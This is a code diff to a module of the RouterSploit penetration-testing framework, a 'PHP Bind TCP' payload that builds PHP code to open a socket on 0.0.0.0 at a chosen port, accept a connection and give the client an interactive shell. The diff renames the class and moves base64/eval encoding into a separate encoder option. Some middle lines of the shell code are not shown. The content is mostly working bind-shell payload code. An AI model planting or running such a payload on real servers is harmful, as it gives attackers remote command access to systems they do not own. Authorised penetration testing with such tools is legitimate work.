@@ -1,8 +1,13 @@
-from base64 import b64encode
-from routersploit.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload
+from routersploit.core.exploit.option import OptString
+from routersploit.core.exploit.payloads import (
+    GenericPayload,
+    Architectures,
+    BindTCPPayloadMixin,
+)
+from routersploit.modules.encoders.php.base64 import Encoder
 
 
-class Exploit(BindTCPPayloadMixin, GenericPayload):
+class Payload(BindTCPPayloadMixin, GenericPayload):
     __info__ = {
         "name": "PHP Bind TCP",
         "description": "Creates interactive tcp bind shell by using php.",
@@ -12,8 +17,11 @@ class Exploit(BindTCPPayloadMixin, GenericPayload):
         ),
     }
 
+    architecture = Architectures.PHP
+    encoder = OptString(Encoder(), "Encoder")
+
     def generate(self):
-        payload = (
+        return (
             "$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);" +
             "socket_bind($s,\"0.0.0.0\",{});".format(self.rport) +
             "socket_listen($s,1);" +
@@ -27,6 +35,3 @@ class Exploit(BindTCPPayloadMixin, GenericPayload):
             "socket_write($cl,$m,strlen($m));" +
             "}}"
         )
-
-        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
-        return "eval(base64_decode('{}'));".format(encoded_payload)
